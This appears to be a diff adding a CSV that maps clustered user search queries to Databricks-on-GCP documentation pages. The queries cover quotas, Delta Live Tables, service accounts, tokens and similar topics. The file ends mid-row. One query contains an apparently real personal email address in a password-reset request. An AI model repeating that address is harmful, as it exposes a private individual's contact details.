@@ -1,0 +1,832 @@
+cluster,url,search_text
+2,https://docs.gcp.databricks.com/,delta lake and delta engine guide streaming iot core to cloud storage
+0,https://docs.gcp.databricks.com/_static/notebooks/mlflow/mlflow-end-to-end-example.html,10.5 ml
+0,https://docs.gcp.databricks.com/administration-guide/access-control/cluster-acl.html,no active google kubernetes engine cluster found for workspace
+0,https://docs.gcp.databricks.com/administration-guide/access-control/table-acl.html,premium dlt
+3,https://docs.gcp.databricks.com/administration-guide/access-control/tokens.html,token management personal access token personal access create token how do
+0,https://docs.gcp.databricks.com/administration-guide/account-settings-gcp/account-console.html,account console account console account console account console account console
+0,https://docs.gcp.databricks.com/administration-guide/account-settings-gcp/account.html,"cancel free trail on google cloud platform cancel subscription domain restricted move to another subscription domain restricted sharing billing administrator bring your own vpc delete account ""order id"""
+0,https://docs.gcp.databricks.com/administration-guide/account-settings-gcp/admin-users.html,delegated authentication accounts api
+0,https://docs.gcp.databricks.com/administration-guide/account-settings-gcp/audit-logs.html,audit log audit logs audit logs audit log audit logs audit log audit log audit logs service account cluster audit logs diagnostic log
+0,https://docs.gcp.databricks.com/administration-guide/account-settings-gcp/index.html,account console manage account cancel subscription delete account create workspace delete account account console account api create workspace create workspace account owner account management
+0,https://docs.gcp.databricks.com/administration-guide/account-settings-gcp/log-delivery.html,log delivery audit logging audit logs audit logs audit log configuration audit log audit log audit log configure audit logg user log audit logs audit logs audit logs configure audit log audit log audit logging log delivery audit log audit log audit log delivery about audit log specifications audit logs audit logs audit logs usage log audit log
+0,https://docs.gcp.databricks.com/administration-guide/account-settings-gcp/quotas.html,"required minimum quotas quota name no active google kubernetes engine cluster found for workspace change gcp project disk quota gcp error message: compute quota exceeded for in region us-east1: quota: ssd_total_gb, used 0.0 and requested 1000.0 out of 500.0 family cores quota cpu core quota gcp quota compute quota compute quota exceeded for expanded-dry ad-347202 in region asia-southeast1: quota: ssd_total_gb, used 0.0 and requested 1500.0 out of 500.0 ""compute engine"" quota limits"
+0,https://docs.gcp.databricks.com/administration-guide/account-settings-gcp/usage-detail-tags-gcp.html,cluster tags monitoring usage view usage usage reports cluster tags cluster tags dbu usage cluster tags
+0,https://docs.gcp.databricks.com/administration-guide/account-settings-gcp/usage.html,billable usage billable usage billable usage usage reports analyze billable usage log data view usage billable usage billable usage cluster billing billing usage delivery billable usage billable usage
+0,https://docs.gcp.databricks.com/administration-guide/account-settings-gcp/workspaces.html,bind service accounts to a cluster. service account cluster service account azure customer managed vpc machine type dbr 8.4 delete workspace service account create workspaces create workspace google cloud charges you an additional per-workspace cost for the gke cluster service peering cidr create workspace gke cluster vpc peering workspace creation create a workspace create and manage workspaces using the account console
+0,https://docs.gcp.databricks.com/administration-guide/account-settings/workload-types.html,jobs compute
+0,https://docs.gcp.databricks.com/administration-guide/admin-console.html,lost admin password
+0,https://docs.gcp.databricks.com/administration-guide/cloud-configurations/gcp/customer-managed-vpc.html,bring your own vpc 32 ip customer managed network managed vpc customer-managed vpc customer-managed vpc vpc service control customer-managed vpc customer-managed vpc static ip vpc peering customer-managed vpc customer-managed vpc customer-managed vpc customer mana customer-managed vpc shared vpc own vpc managed vpc
+3,https://docs.gcp.databricks.com/administration-guide/cloud-configurations/gcp/firewall.html,"private service vpc service ""compute engine"" private google access google  private access nat gateway"
+0,https://docs.gcp.databricks.com/administration-guide/cloud-configurations/gcp/index.html,manage gcp infrastructure network configuration vpc peering cloud log
+0,https://docs.gcp.databricks.com/administration-guide/cloud-configurations/gcp/network-sizing.html,network sizing ip address calc pods per node network cidr
+0,https://docs.gcp.databricks.com/administration-guide/cloud-configurations/gcp/permissions.html,"bind service accounts to a cluster. service account service account compute service account iam permissions service account cross project gcp service account service account user role service account service account cluster ""service account"" service account permission"
+0,https://docs.gcp.databricks.com/administration-guide/cloud-configurations/gcp/regions.html,gcp regions specifying region
+0,https://docs.gcp.databricks.com/administration-guide/clusters/policies-best-practices.html,cluster policies
+0,https://docs.gcp.databricks.com/administration-guide/clusters/policies.html,org policy cluster policies cluster policy cluster policy cluster policies cluster policies cluster policies cluster policies
+0,https://docs.gcp.databricks.com/administration-guide/clusters/web-terminal.html,cluster terminated by gcp_quota_exceeded delete files dbfts
+0,https://docs.gcp.databricks.com/administration-guide/disaster-recovery.html,disaster reco disaster recovery disaster recovery
+0,https://docs.gcp.databricks.com/administration-guide/genie.html,salesforce ticket
+0,https://docs.gcp.databricks.com/administration-guide/index.html,billing api
+0,https://docs.gcp.databricks.com/administration-guide/users-groups/index.html,sso api
+0,https://docs.gcp.databricks.com/administration-guide/users-groups/scim/index.html,scim api scim integration workload identity identity federation
+0,https://docs.gcp.databricks.com/administration-guide/users-groups/single-sign-on/index.html,single sign-on authentication failed. single sigon single sign on active directory azure single sign-on google identity single sign on single sign on okta sso
+0,https://docs.gcp.databricks.com/administration-guide/users-groups/users.html,add users to a workspace manage users service principal add user service principal service principal service principal maximim number of users user entitlement admin service principal manage users service principal scim ad groups
+3,https://docs.gcp.databricks.com/administration-guide/workspace/dbfs-browser.html,dbfs access disabled
+0,https://docs.gcp.databricks.com/administration-guide/workspace/dbfs-ui-upload.html,managed vs unmanaged data
+0,https://docs.gcp.databricks.com/administration-guide/workspace/notebooks.html,add user notebook utilit notebook features
+0,https://docs.gcp.databricks.com/administration-guide/workspace/security.html,mime type sniffing prevention
+0,https://docs.gcp.databricks.com/administration-guide/workspace/storage.html,purge workspaxe objects delete workspace dbfs rest api is disabled for this workspace.
+1,https://docs.gcp.databricks.com/applications/genomics/tertiary-analytics/hail.html,databricks container services
+6,https://docs.gcp.databricks.com/applications/genomics/tertiary-analytics/index.html,apache spark
+1,https://docs.gcp.databricks.com/applications/machine-learning/automl.html,databricks automl data exploration
+0,https://docs.gcp.databricks.com/applications/machine-learning/environment-setup.html,definitive guide
+0,https://docs.gcp.databricks.com/applications/machine-learning/experiments-page.html,this section describes how to create a workspace experiment mlflow experiment: restexception: feature_disabled: creation of experiments outside the workspace is not enabled. artifact location experiment logs
+0,https://docs.gcp.databricks.com/applications/machine-learning/feature-store/access-control.html,can manage
+0,https://docs.gcp.databricks.com/applications/machine-learning/feature-store/concepts.html,online store online feature + dynamodb
+5,https://docs.gcp.databricks.com/applications/machine-learning/feature-store/feature-tables.html,share feature feature table
+0,https://docs.gcp.databricks.com/applications/machine-learning/feature-store/index.html,feature store feature store feature store feature store feature store feature store feature store feature store feature store feature store feature store feature store
+0,https://docs.gcp.databricks.com/applications/machine-learning/feature-store/python-api.html,feature store
+0,https://docs.gcp.databricks.com/applications/machine-learning/feature-store/time-series.html,time series tables
+0,https://docs.gcp.databricks.com/applications/machine-learning/feature-store/troubleshooting-and-limitations.html,modulenotfounderror: no module named 'mlflow'
+0,https://docs.gcp.databricks.com/applications/machine-learning/load-data/ddl-data.html,free training for ups
+0,https://docs.gcp.databricks.com/applications/machine-learning/load-data/index.html,upload data
+0,https://docs.gcp.databricks.com/applications/machine-learning/load-data/petastorm.html,single node training
+0,https://docs.gcp.databricks.com/applications/machine-learning/load-data/tfrecords-save-load.html,save file
+0,https://docs.gcp.databricks.com/applications/machine-learning/model-inference/index.html,serving to
+0,https://docs.gcp.databricks.com/applications/machine-learning/models.html,model lifecycle mlflow model share models model monitoring
+0,https://docs.gcp.databricks.com/applications/machine-learning/track-model-development/index.html,track model development
+6,https://docs.gcp.databricks.com/applications/machine-learning/train-model/dl-best-practices.html,spark node size gpu deep learning samples
+0,https://docs.gcp.databricks.com/applications/machine-learning/train-model/index.html,timed train
+0,https://docs.gcp.databricks.com/applications/machine-learning/train-model/keras-tutorial.html,tensorflow and keras
+0,https://docs.gcp.databricks.com/applications/machine-learning/train-model/machine-learning.html,the big book of machine learning use cases
+0,https://docs.gcp.databricks.com/applications/machine-learning/train-model/xgboost.html,basemargincol xgboost
+0,https://docs.gcp.databricks.com/applications/mlflow/model-registry-example.html,mlflow model model regis
+0,https://docs.gcp.databricks.com/applications/mlflow/model-registry-webhooks.html,mlflow webhooks
+0,https://docs.gcp.databricks.com/applications/mlflow/model-registry.html,mlflow model registry model registry model registry mlflow model registry staging options
+0,https://docs.gcp.databricks.com/applications/mlflow/model-serving.html,cluster status pending model event start model serving with api enable mlflow serving model serving model serving
+0,https://docs.gcp.databricks.com/applications/mlflow/models.html,save models mlflow pyfunc log_model code_path
+0,https://docs.gcp.databricks.com/applications/mlflow/projects.html,mlflow project mlflow cli
+0,https://docs.gcp.databricks.com/applications/mlflow/quick-start-python.html,list python package python udf
+0,https://docs.gcp.databricks.com/applications/mlflow/quick-start-r.html,r synta r notebook
+0,https://docs.gcp.databricks.com/applications/mlflow/tracking-ex-pyspark.html,pyspark pmml
+0,https://docs.gcp.databricks.com/applications/mlflow/tracking-ex-pytorch.html,python package
+0,https://docs.gcp.databricks.com/applications/mlflow/tracking.html,track machine learning training runs
+0,https://docs.gcp.databricks.com/clusters/cluster-config-best-practices.html,clusters best shuffle autoscaling cost controls spot instance storage autoscaling cluster sizing spot instances
+6,https://docs.gcp.databricks.com/clusters/configure.html,cluster log cluster log aggressive scaling down preemptible vm instances cluster settings spark node size reliable cluster configurations cluster configuration page standard cluster service account
+0,https://docs.gcp.databricks.com/clusters/create.html,create cluster create cluster create cluster create cluster create cluster
+0,https://docs.gcp.databricks.com/clusters/gpu.html,gpu instances worker type gpu cluster gpu instances
+0,https://docs.gcp.databricks.com/clusters/index.html,cluster log delivery gke cluster cluster template job cluster cluster pol cluster log delivery cluster configure cluster timeout
+0,https://docs.gcp.databricks.com/clusters/init-scripts.html,init script global init script init scripts environment variables exclude runtime script script exit status is non-zero init script cluster logs
+0,https://docs.gcp.databricks.com/clusters/instance-pools/configure.html,instance type family cores quota instance types idle instance auto termination
+0,https://docs.gcp.databricks.com/clusters/instance-pools/edit.html,edit compute pool
+0,https://docs.gcp.databricks.com/clusters/instance-pools/index.html,instance pool
+0,https://docs.gcp.databricks.com/clusters/preemption.html,fair scheduling
+0,https://docs.gcp.databricks.com/clusters/single-node.html,cluster settings
+2,https://docs.gcp.databricks.com/data-engineering/delta-live-tables/delta-live-tables-concepts.html,data live tables delta live tables delta live tables delta live delta live tables delta live tables delta live tables live table materialized views
+2,https://docs.gcp.databricks.com/data-engineering/delta-live-tables/delta-live-tables-cookbook.html,delta live tables import dlt
+0,https://docs.gcp.databricks.com/data-engineering/delta-live-tables/delta-live-tables-event-log.html,event log event log
+0,https://docs.gcp.databricks.com/data-engineering/delta-live-tables/delta-live-tables-incremental-data.html,monitor stream building incrementally processed etl pipelines streaming google pub/sub streaming in pro stream failure
+0,https://docs.gcp.databricks.com/data-engineering/delta-live-tables/delta-live-tables-publish.html,create database
+0,https://docs.gcp.databricks.com/data-engineering/delta-live-tables/delta-live-tables-python-ref.html,great expectation python library dlt apply
+2,https://docs.gcp.databricks.com/data-engineering/delta-live-tables/delta-live-tables-quickstart.html,delta live
+2,https://docs.gcp.databricks.com/data-engineering/delta-live-tables/delta-live-tables-sql-ref.html,delta live tables drop
+0,https://docs.gcp.databricks.com/data-engineering/delta-live-tables/delta-live-tables-ui.html,create database
+2,https://docs.gcp.databricks.com/data-engineering/delta-live-tables/index.html,delta live live table delta live tables delta live tables delta live table live tables delta live table delta live tables delta live tables delta live tables delta live tables delta live tables live tables delta live table live t delta live delta live great expectations delta live tables delta live
+0,https://docs.gcp.databricks.com/data-engineering/index.html,data processing
+0,https://docs.gcp.databricks.com/data-engineering/jobs/index.html,workflows with jobs workflows with jobs workflows with jobs multi task
+6,https://docs.gcp.databricks.com/data-engineering/jobs/jobs-quickstart.html,"com.google.cloud.spark.bigquery.repackaged.com.google.inject.provision exception: unable to provision, see the following errors: details for job com.google.cloud.spark.bigquery.repackaged.com.google.inject.provision exception: unable to provision, see the following errors: create job create a job delta live tables"
+6,https://docs.gcp.databricks.com/data-engineering/jobs/jobs.html,legacy spark-submit task retries multi task
+0,https://docs.gcp.databricks.com/data/data-sources/aws/amazon-redshift.html,redshift jdbc driver
+0,https://docs.gcp.databricks.com/data/data-sources/aws/amazon-s3-select.html,s3 dbfs hadoop configuration
+3,https://docs.gcp.databricks.com/data/data-sources/aws/amazon-s3.html,s3 dbfs s3 access dlt aws s3 lifecycle s3
+0,https://docs.gcp.databricks.com/data/data-sources/azure/azure-storage.html,storage account name
+6,https://docs.gcp.databricks.com/data/data-sources/azure/cosmosdb-connector.html,facing issue while writing data to cosmos through spark
+2,https://docs.gcp.databricks.com/data/data-sources/google/bigquery.html,enable views bigquery bind service accounts to a cluster. write to bigquery load csv to bigquery service account azure bigquery integration google big query querying delta. from. bigquery google sheets
+0,https://docs.gcp.databricks.com/data/data-sources/google/gcs.html,google cloud services cloud storage service account mount bucket google cloud storage service account cloud storage service account cloud storage service account google cloud storage blob storage gcs cloud storage service account google cloud storage cloud storage service account google cloud storage cloud storage service account gcs bucket cloud storage service keys service account cloud log google cloud storage autoscaling ssd storage
+0,https://docs.gcp.databricks.com/data/data-sources/hive-tables.html,python read database tables
+0,https://docs.gcp.databricks.com/data/data-sources/image.html,working on image files
+2,https://docs.gcp.databricks.com/data/data-sources/index.html,data source data sour failed to find data source: tahoe. apache spark connection as data source create delta table
+0,https://docs.gcp.databricks.com/data/data-sources/mlflow-experiment.html,experiments api create workspace experiment
+0,https://docs.gcp.databricks.com/data/data-sources/read-csv.html,binary file export file copy output to local csv file
+6,https://docs.gcp.databricks.com/data/data-sources/read-parquet.html,parquet table copy file parquet file how to read gcs file how to read gcs file create parquet spark write parquet file to folder read parquet file
+0,https://docs.gcp.databricks.com/data/data-sources/snowflake.html,load data from snowflake
+4,https://docs.gcp.databricks.com/data/data-sources/sql-databases.html,spark sql etl jdbc connecting to sql databases using jdbc jdbc connect connec† sql sql endpoint connection details simba jdbc
+0,https://docs.gcp.databricks.com/data/data-sources/xml.html,parsing xml xml parsing
+1,https://docs.gcp.databricks.com/data/databricks-file-system.html,file system configure dbfs custom dbfs mount point databricks file system (dbfs) dbfs move file dbfs rest api is disabled for this workspace object storage dbfs rest api is disabled dbfs api dbutils cp databricks file system (dbfs) upload file dbfs rest api is disabled for this workspace. dbfs utils databricks file system dbfs gcs uploading files mount mnt local disk encryption dbfs rest api is disabled for this workspace dbfs mounts dbfs api
+0,https://docs.gcp.databricks.com/data/filestore.html,temp folder
+0,https://docs.gcp.databricks.com/data/metastores/external-hive-metastore.html,vpc peering external apache hive metastore external metastore metastore separate vpc hive metastore hive metastore external hive external apache hive metastore
+0,https://docs.gcp.databricks.com/data/metastores/index.html,hive metastore default metastore location data proc metastore
+2,https://docs.gcp.databricks.com/delta/best-practices.html,delta lake start
+0,https://docs.gcp.databricks.com/delta/concurrency-control.html,optimistic concurrency
+0,https://docs.gcp.databricks.com/delta/data-transformation/complex-types.html,data type copy into
+0,https://docs.gcp.databricks.com/delta/data-transformation/index.html,data type
+2,https://docs.gcp.databricks.com/delta/delta-apidoc.html,delta lake
+2,https://docs.gcp.databricks.com/delta/delta-batch.html,mode overwrite create delta table
+2,https://docs.gcp.databricks.com/delta/delta-change-data-feed.html,change set readstream delta
+2,https://docs.gcp.databricks.com/delta/delta-ingest.html,copy into ingest data copy into ingest incremental migrating transactional data to a delta lake using aws dms: schema evolution delta lake start copy parquet
+2,https://docs.gcp.databricks.com/delta/delta-intro.html,load data into delta tables time travel
+0,https://docs.gcp.databricks.com/delta/delta-streaming.html,building batch-processed etl pipelines input rate
+5,https://docs.gcp.databricks.com/delta/delta-update.html,delete table schema evolution
+2,https://docs.gcp.databricks.com/delta/index.html,delta lake delta lake guide
+2,https://docs.gcp.databricks.com/delta/integrations.html,delta table external data access databricks athena manifest external data
+5,https://docs.gcp.databricks.com/delta/intro-notebooks.html,load table result
+0,https://docs.gcp.databricks.com/delta/join-performance/skew-join.html,adaptive skew
+2,https://docs.gcp.databricks.com/delta/optimizations/auto-optimize.html,delta auto op
+2,https://docs.gcp.databricks.com/delta/optimizations/delta-cache.html,delta cache delta caching
+0,https://docs.gcp.databricks.com/delta/optimizations/dynamic-file-pruning.html,dynamic views
+0,https://docs.gcp.databricks.com/delta/optimizations/index.html,data skipping indexes
+0,https://docs.gcp.databricks.com/delta/optimizations/optimization-examples.html,copy into
+0,https://docs.gcp.databricks.com/delta/porting.html,workspace migration
+5,https://docs.gcp.databricks.com/delta/versioning.html,show table versions
+0,https://docs.gcp.databricks.com/dev-tools/api/1.2/index.html,dlt job status
+0,https://docs.gcp.databricks.com/dev-tools/api/2.0/jobs.html,job api jobs api
+0,https://docs.gcp.databricks.com/dev-tools/api/2.1/index.html,rest api rest api rest ao
+1,https://docs.gcp.databricks.com/dev-tools/api/index.html,rest api rest api account api enable api rest api rest api cluster json rest api databricks api rest api rest api rest api rest api
+3,https://docs.gcp.databricks.com/dev-tools/api/latest/authentication.html,personal access token personal access tokens access token gcp credits api token
+0,https://docs.gcp.databricks.com/dev-tools/api/latest/clusters.html,enable api cluster api api cl cluster terminated by gcp_quota_exceeded cluster api clusters api api refernce cluster api
+0,https://docs.gcp.databricks.com/dev-tools/api/latest/examples.html,account api dbfs api import dbc create workspace dbfs api dbfs api account api account api
+0,https://docs.gcp.databricks.com/dev-tools/api/latest/global-init-scripts.html,init script grobal init script init script init script
+0,https://docs.gcp.databricks.com/dev-tools/api/latest/groups.html,api 2.0
+0,https://docs.gcp.databricks.com/dev-tools/api/latest/instance-pools.html,autoscaling local storage
+3,https://docs.gcp.databricks.com/dev-tools/api/latest/ip-access-list.html,ip access lists ip access list ip access list
+0,https://docs.gcp.databricks.com/dev-tools/api/latest/jobs.html,jobs api jobs api jobs api
+0,https://docs.gcp.databricks.com/dev-tools/api/latest/libraries.html,list package whl file install
+0,https://docs.gcp.databricks.com/dev-tools/api/latest/policies.html,cluster policies cluster policy attribute paths
+0,https://docs.gcp.databricks.com/dev-tools/api/latest/scim/index.html,scim api
+0,https://docs.gcp.databricks.com/dev-tools/api/latest/scim/scim-users.html,deactivate user scim integration user entitlement deactivate user scim oidc
+0,https://docs.gcp.databricks.com/dev-tools/api/latest/secrets.html,"key management initial_manage_principal \""users\"""
+0,https://docs.gcp.databricks.com/dev-tools/api/latest/tokens.html,api token
+0,https://docs.gcp.databricks.com/dev-tools/api/latest/workspace.html,workspace api workspace api workspace api gcp api import dbc create workspace
+0,https://docs.gcp.databricks.com/dev-tools/api/python/latest/feature-store/databricks.feature_store.entities.feature_lookup.html,feature lookup
+0,https://docs.gcp.databricks.com/dev-tools/api/python/latest/feature-store/online_store_spec/databricks.feature_store.online_store_spec.amazon_rds_mysql_online_store_spec.html,error 'failed to store the result. try rerunning the command'
+0,https://docs.gcp.databricks.com/dev-tools/api/python/latest/feature-store/online_store_spec/databricks.feature_store.online_store_spec.azure_mysql_online_store_spec.html,fs.azure.account.auth.type sharedkey
+4,https://docs.gcp.databricks.com/dev-tools/api/python/latest/feature-store/online_store_spec/databricks.feature_store.online_store_spec.azure_sql_server_online_store_spec.html,find server name sql server the instance of the sql server database engine cannot obtain a lock resource at this time
+0,https://docs.gcp.databricks.com/dev-tools/api/python/latest/feature-store/online_store_spec/databricks.feature_store.online_store_spec.online_store_spec.html,online feature store online store
+0,https://docs.gcp.databricks.com/dev-tools/ci-cd/ci-cd-github.html,jobs runs
+0,https://docs.gcp.databricks.com/dev-tools/ci-cd/ci-cd-jenkins.html,automation testing with gcp
+6,https://docs.gcp.databricks.com/dev-tools/cli/clusters-cli.html,cluster id spark versions list clusters cli
+0,https://docs.gcp.databricks.com/dev-tools/cli/dbfs-cli.html,dbfs api cli profile fs move files directories to cli
+1,https://docs.gcp.databricks.com/dev-tools/cli/index.html,databricks cli auth databricks cli databricks cli databricks cli databricks cli databricks cli databricks cli databricks cli
+0,https://docs.gcp.databricks.com/dev-tools/cli/libraries-cli.html,google cloud jar file
+6,https://docs.gcp.databricks.com/dev-tools/cli/runs-cli.html,legacy spark-submit
+0,https://docs.gcp.databricks.com/dev-tools/cli/secrets-cli.html,create secret scope dbutils secret initial manage user scopes
+1,https://docs.gcp.databricks.com/dev-tools/cli/tokens-cli.html,databricks oauth token
+1,https://docs.gcp.databricks.com/dev-tools/cli/workspace-cli.html,databricks workspace
+1,https://docs.gcp.databricks.com/dev-tools/databricks-connect.html,"databricks connect databricks connect java version koalas pyspark databricks connect a connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond koalas pyspark db connect databricks connect adding libraries using databricks connect"
+0,https://docs.gcp.databricks.com/dev-tools/databricks-utils.html,"tag dbutils dbutils.secrets.get(scope = 'es312u', key = 'deep') dbutils getcontext dbutils secrets dbutils get secrets db utils"
+0,https://docs.gcp.databricks.com/dev-tools/datagrip.html,create token how do
+0,https://docs.gcp.databricks.com/dev-tools/index.html,patterns and practices cluster job
+0,https://docs.gcp.databricks.com/dev-tools/pyodbc.html,"import pyodbc a connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond koalas pyspark"
+4,https://docs.gcp.databricks.com/dev-tools/python-sql-connector.html,databricks sql databricks sql databricks sql databricks sql databricks sql databricks sql
+0,https://docs.gcp.databricks.com/dev-tools/terraform/index.html,create a job using terraform workspace terraform
+2,https://docs.gcp.databricks.com/error-messages/index.html,"the error typically occurs when the default log store implementation, that is, featurestore, is used to write into a delta table on a non-hdfs storage system. in order to get the transactional acid aug"
+0,https://docs.gcp.databricks.com/getting-started/admin-get-started.html,failed to get oatuh
+0,https://docs.gcp.databricks.com/getting-started/community-edition.html,free trial community edition
+0,https://docs.gcp.databricks.com/getting-started/concepts.html,workload insights column
+0,https://docs.gcp.databricks.com/getting-started/connect/index.html,etl firewall
+0,https://docs.gcp.databricks.com/getting-started/delta.html,bronze silver
+1,https://docs.gcp.databricks.com/getting-started/free-training.html,self paced free free training for ups get free databricks training reset password for my burkomo@gmail.com  account
+0,https://docs.gcp.databricks.com/getting-started/index.html,free trial getting started
+0,https://docs.gcp.databricks.com/getting-started/introduction/index.html,gcp architecture
+0,https://docs.gcp.databricks.com/getting-started/overview.html,external data source gcp architecture control plane
+0,https://docs.gcp.databricks.com/getting-started/spark/dataframes.html,pyspark dataframe from gcp bucket
+6,https://docs.gcp.databricks.com/getting-started/spark/datasets.html,spark datasets
+6,https://docs.gcp.databricks.com/getting-started/spark/index.html,apache spark
+6,https://docs.gcp.databricks.com/getting-started/spark/quick-start.html,spark context start cluster cluster is not getting started
+0,https://docs.gcp.databricks.com/getting-started/try-databricks-gcp.html,cancel free trail on google cloud platform free trial gcp quota exceed failed to get oauth gcp quota free trial
+0,https://docs.gcp.databricks.com/getting-started/tutorials/index.html,best practices best prac
+0,https://docs.gcp.databricks.com/index.html,no active google kubernetes engine cluster found for workspace
+5,https://docs.gcp.databricks.com/ingestion/add-data/index.html,create table upload zip file unity catalog is in public preview. create table
+0,https://docs.gcp.databricks.com/ingestion/auto-loader/csv.html,load csv into data frame
+1,https://docs.gcp.databricks.com/ingestion/auto-loader/index.html,auto loader databricks autoloader
+2,https://docs.gcp.databricks.com/ingestion/copy-into/index.html,load data into delta tables
+0,https://docs.gcp.databricks.com/ingestion/index.html,data ingest
+0,https://docs.gcp.databricks.com/integrations/bi/jdbc-odbc-bi.html,odbc driver m1 ssl jdbc jdbc guide jdbc connecy
+0,https://docs.gcp.databricks.com/integrations/bi/looker.html,dimension tables
+0,https://docs.gcp.databricks.com/integrations/bi/mode.html,mode overwrite
+2,https://docs.gcp.databricks.com/integrations/bi/power-bi.html,power bi delta sharing odbc: error [hy000]
+0,https://docs.gcp.databricks.com/integrations/index.html,integration service business intelligence
+1,https://docs.gcp.databricks.com/integrations/partners.html,connect partners databricks partner connect partner connect partner connect
+0,https://docs.gcp.databricks.com/lakehouse/index.html,lakehouse fundamental
+0,https://docs.gcp.databricks.com/languages/koalas.html,koalas pyspark
+0,https://docs.gcp.databricks.com/languages/pandas-spark.html,pandas api
+0,https://docs.gcp.databricks.com/languages/python.html,self paced free import notebook pyspark api koalas pyspark
+0,https://docs.gcp.databricks.com/libraries/cluster-libraries.html,installing libr
+1,https://docs.gcp.databricks.com/libraries/index.html,runtime libraries fail to install python library glpk adding libraries using databricks connect install ubuntu libraries
+6,https://docs.gcp.databricks.com/libraries/notebooks-python-libraries.html,notebook scoped libraries install notebook spark env fail to install python library glpk notebook scoped library databricks install python modules in notebook
+0,https://docs.gcp.databricks.com/libraries/workspace-libraries.html,workspace libraries install jar file using python for google cloud list package python wheel create folder under filestore
+0,https://docs.gcp.databricks.com/migration/production.html,ganglia metrics ganglia metrics
+0,https://docs.gcp.databricks.com/migration/single-node.html,single node training
+0,https://docs.gcp.databricks.com/notebooks/github-version-control.html,github repo
+0,https://docs.gcp.databricks.com/notebooks/index.html,share notebook schedule a notebook notebook parameter share notebook testing notebooks notebook results storage
+4,https://docs.gcp.databricks.com/notebooks/notebook-workflows.html,db sql
+0,https://docs.gcp.databricks.com/notebooks/notebooks-manage.html,maximum execution context manage notebooks create notebook maximum execution context notebook parameter import dbc
+0,https://docs.gcp.databricks.com/notebooks/package-cells.html,list python package
+0,https://docs.gcp.databricks.com/notebooks/visualizations/html-d3-and-svg.html,import notebook
+0,https://docs.gcp.databricks.com/notebooks/visualizations/index.html,data profiles auto plot adjustment
+0,https://docs.gcp.databricks.com/notebooks/widgets.html,widget runtime
+0,https://docs.gcp.databricks.com/py-modindex.html,python module index dlt python module python module
+1,https://docs.gcp.databricks.com/reference/command.html,tag dbutils object storage databricks cli
+0,https://docs.gcp.databricks.com/reference/mlflow-api.html,api services mlflow api
+4,https://docs.gcp.databricks.com/release-notes/gcp-features.html,"container services credential passthrough google kubernetes engine accounts api feature parity billable usage delivery to gcs bucket active directory account api google cloud customer managed vpc cloud composer account api unexpected state for cluster - failure customize containers with databricks container services accounts api customer managed keys openid connect account api billable usage delivery to gcs bucket workload identity feature parity ""service account"" sql endpoint on google cloud cluster launch timeout. no active google kubernetes engine cluster found for workspace. retrying google kubernetes engine cluster creation. active directory"
+0,https://docs.gcp.databricks.com/release-notes/index.html,release notes release notes
+0,https://docs.gcp.databricks.com/release-notes/product/2021/april.html,python library
+0,https://docs.gcp.databricks.com/release-notes/product/2021/february.html,power bi google cloud storage
+0,https://docs.gcp.databricks.com/release-notes/product/2021/july.html,secure cluster
+0,https://docs.gcp.databricks.com/release-notes/product/2021/march.html,gke version
+0,https://docs.gcp.databricks.com/release-notes/product/2021/november.html,preemptible vm instances
+0,https://docs.gcp.databricks.com/release-notes/product/2021/september.html,unity catalog is in public preview.
+5,https://docs.gcp.databricks.com/release-notes/product/2022/april.html,live table tags release notes job alert
+0,https://docs.gcp.databricks.com/release-notes/product/2022/may.html,driver proxy
+0,https://docs.gcp.databricks.com/release-notes/product/index.html,public ips
+1,https://docs.gcp.databricks.com/release-notes/runtime/10.2ml.html,databricks runtime 10.2 ml
+1,https://docs.gcp.databricks.com/release-notes/runtime/11.0.html,databricks connect beta
+0,https://docs.gcp.databricks.com/release-notes/runtime/7.4.html,aws attributes
+0,https://docs.gcp.databricks.com/release-notes/runtime/8.0.html,credential passthrough credential passthrough
+1,https://docs.gcp.databricks.com/release-notes/runtime/8.2.html,databricks runtime
+0,https://docs.gcp.databricks.com/release-notes/runtime/9.0ml.html,google client library
+0,https://docs.gcp.databricks.com/release-notes/runtime/9.1.html,9.1 lts conda on 9.1 lts runtime 9.1 lts 9.1 lts 9.1 lts 9.1 lts
+0,https://docs.gcp.databricks.com/release-notes/runtime/9.1ml.html,9.1 lts ml pytorch lightning
+0,https://docs.gcp.databricks.com/release-notes/runtime/databricks-runtime-ver.html,end of life supported dbr supported releases java runtime support
+0,https://docs.gcp.databricks.com/release-notes/runtime/maintenance-updates.html,credential passthrough
+0,https://docs.gcp.databricks.com/release-notes/runtime/releases.html,runtime 10
+0,https://docs.gcp.databricks.com/repos/gitlab-version-control.html,control version
+1,https://docs.gcp.databricks.com/repos/index.html,"error on git pull after enabling ""‘files in repos’ feature"" where to find  repos icon files in repos arbitrary files in repos create repos in databricks"
+0,https://docs.gcp.databricks.com/repos/set-up-git-integration.html,azure devops configure git repository
+0,https://docs.gcp.databricks.com/resources/limits.html,workspace limits standard premium copy into limit
+0,https://docs.gcp.databricks.com/resources/status.html,manage subscription
+1,https://docs.gcp.databricks.com/resources/support.html,open a support ticket business critical support databricks support ticket # 00147690 support coverage
+0,https://docs.gcp.databricks.com/resources/supported-browsers.html,installing chrome
+0,https://docs.gcp.databricks.com/runtime/conda.html,conda on 9.1 lts
+0,https://docs.gcp.databricks.com/runtime/dbr.html,runtime version runtime version
+1,https://docs.gcp.databricks.com/runtime/index.html,databricks runtimes
+1,https://docs.gcp.databricks.com/runtime/mlruntime.html,central model registry databricks runtime 10.3 ml
+4,https://docs.gcp.databricks.com/runtime/photon.html,photon on azure sql to dataframe
+0,https://docs.gcp.databricks.com/search.html,excel google sheet google cloud cloud comparison google sheets google sheets google cloud google drive connector
+0,https://docs.gcp.databricks.com/security/access-control/cluster-acl.html,"""service account"""
+3,https://docs.gcp.databricks.com/security/access-control/index.html,"revoking permissions access control lists table access control role-based access access control overview role based access control access controls access control ""please use a valid cross account iam role with permissions setup correctly"" access control access control access control overview access control restrict mount access"
+0,https://docs.gcp.databricks.com/security/access-control/jobs-acl.html,create a job using terraform
+3,https://docs.gcp.databricks.com/security/access-control/table-acls/index.html,table access control table access sql endpoint table access control table access controls table access control
+3,https://docs.gcp.databricks.com/security/access-control/table-acls/table-acl.html,9.1 lts ml does not support table access control enable table access control enable table access control
+0,https://docs.gcp.databricks.com/security/access-control/workspace-acl.html,temp folder
+0,https://docs.gcp.databricks.com/security/hipaa.html,private preview
+3,https://docs.gcp.databricks.com/security/index.html,ip access list domain re
